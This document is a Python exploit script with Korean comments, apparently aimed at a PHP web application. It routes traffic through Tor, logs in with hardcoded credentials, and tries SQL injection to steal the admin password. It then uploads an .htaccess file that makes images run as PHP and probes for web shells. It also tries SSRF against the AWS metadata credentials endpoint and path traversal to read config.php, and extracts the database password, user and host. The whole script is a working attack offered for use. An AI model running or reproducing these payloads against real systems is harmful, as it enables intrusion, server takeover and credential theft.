#!/usr/bin/env python3
"""
인증된 세션으로 직접 공격
alice 세션으로 실제 작동하는 공격만 실행
"""

import requests
import sys
import time
import urllib.parse

def exploit(target_ip, attacker_ip, attacker_port):
    base_url = f"http://{target_ip}"

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    print(f"[*] 타겟: {target_ip}")
    print(f"[*] C2: {attacker_ip}:{attacker_port}\n")

    # 1. alice 로그인
    print("[1] alice 로그인...")
    data = {'username': 'alice', 'password': 'alice2024'}
    resp = session.post(f"{base_url}/login.php", data=data, allow_redirects=True, timeout=10)

    if 'login.php' in resp.url:
        print("[-] 로그인 실패")
        return

    print("[+] alice 로그인 성공\n")

    # 2. SQL Injection으로 admin 비밀번호 탈취 시도 (인증된 세션에서)
    print("[2] SQL Injection - admin 계정 탈취...")

    # 검색 기능에 SQL Injection
    sqli_payloads = [
        "' OR 1=1-- ",
        "' UNION SELECT username,password,NULL,NULL FROM users WHERE username='admin'-- ",
        "admin'-- ",
    ]

    for payload in sqli_payloads:
        try:
            # 검색 페이지
            resp = session.get(f"{base_url}/search.php?q={urllib.parse.quote(payload)}", timeout=5)

            if 'admin' in resp.text.lower() and len(resp.text) < 5000:
                print(f"[+] SQL Injection 작동!")
                print(f"    응답:\n{resp.text[:500]}")
        except:
            pass

    # 3. 파일 업로드 - .htaccess 덮어쓰기
    print("\n[3] .htaccess 업로드로 PHP 실행 활성화...")

    htaccess_content = b"""AddType application/x-httpd-php .jpg .png .gif .jpeg
<FilesMatch ".(jpg|png|gif|jpeg)$">
    SetHandler application/x-httpd-php
</FilesMatch>
"""

    files = {'file': ('.htaccess', htaccess_content, 'text/plain')}

    try:
        resp = session.post(f"{base_url}/upload.php", files=files, timeout=10)
        print(f"    Status: {resp.status_code}")

        if resp.status_code == 200:
            print(f"[+] .htaccess 업로드 성공")

            # 이제 기존 업로드된 이미지 파일이 PHP로 실행됨
            print("\n[4] 기존 업로드 파일을 PHP로 실행 시도...")

            uploaded_files = [
                "photo.php.jpg",
                "avatar_4727.jpg",
                "shell_4727.php",
            ]

            for filename in uploaded_files:
                test_url = f"{base_url}/uploads/{filename}"
                resp = session.get(test_url, timeout=5)

                print(f"    {filename}: {resp.status_code} - {len(resp.text)} bytes")

    except Exception as e:
        print(f"[-] .htaccess 업로드 실패: {e}")

    # 4. SSRF로 내부 서비스 접근
    print("\n[5] SSRF - 내부 AWS 메타데이터 접근...")

    ssrf_urls = [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://127.0.0.1:3306",  # MySQL
        "http://localhost/server-status",  # Apache status
    ]

    for ssrf_url in ssrf_urls:
        try:
            url = f"{base_url}/file.php?name={ssrf_url}"
            resp = session.get(url, timeout=3)

            if resp.status_code == 200 and len(resp.text) > 0:
                print(f"[+] SSRF 성공: {ssrf_url}")
                print(f"    응답: {resp.text[:200]}")
        except:
            pass

    # 5. Path Traversal - 설정 파일 읽기
    print("\n[6] Path Traversal - 설정 파일...")

    files_to_read = [
        "../../config.php",
        "../config.php",
        "config.php",
        "../../../var/www/html/config.php",
    ]

    for filepath in files_to_read:
        try:
            url = f"{base_url}/file.php?name={filepath}"
            resp = session.get(url, timeout=5)

            if 'mysql' in resp.text.lower() or 'password' in resp.text.lower():
                print(f"\n[+] ✅ 설정 파일 발견: {filepath}")
                print(f"{resp.text[:500]}")

                # DB 정보 파싱
                import re
                db_pass = re.findall(r'password["\']?\s*[=:]\s*["\']([^"\']+)', resp.text, re.IGNORECASE)
                db_user = re.findall(r'user(?:name)?["\']?\s*[=:]\s*["\']([^"\']+)', resp.text, re.IGNORECASE)
                db_host = re.findall(r'host["\']?\s*[=:]\s*["\']([^"\']+)', resp.text, re.IGNORECASE)

                if db_pass:
                    print(f"\n[+] ✅✅✅ DB 비밀번호: {db_pass[0]}")
                if db_user:
                    print(f"[+] DB 사용자: {db_user[0]}")
                if db_host:
                    print(f"[+] DB 호스트: {db_host[0]}")

                    return {'db_user': db_user[0] if db_user else None,
                            'db_pass': db_pass[0] if db_pass else None,
                            'db_host': db_host[0] if db_host else None}

        except:
            pass

    print("\n[-] 모든 시도 완료")

def main():
    if len(sys.argv) < 4:
        print("사용법: python3 96_exploit_authenticated.py <TARGET> <ATTACKER_IP> <PORT>")
        sys.exit(1)

    target_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = sys.argv[3]

    exploit(target_ip, attacker_ip, attacker_port)

if __name__ == "__main__":
    main()
